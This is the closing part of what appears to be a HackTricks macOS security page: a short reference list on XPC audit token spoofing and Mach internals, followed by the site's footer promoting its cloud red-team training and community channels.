* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
* [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
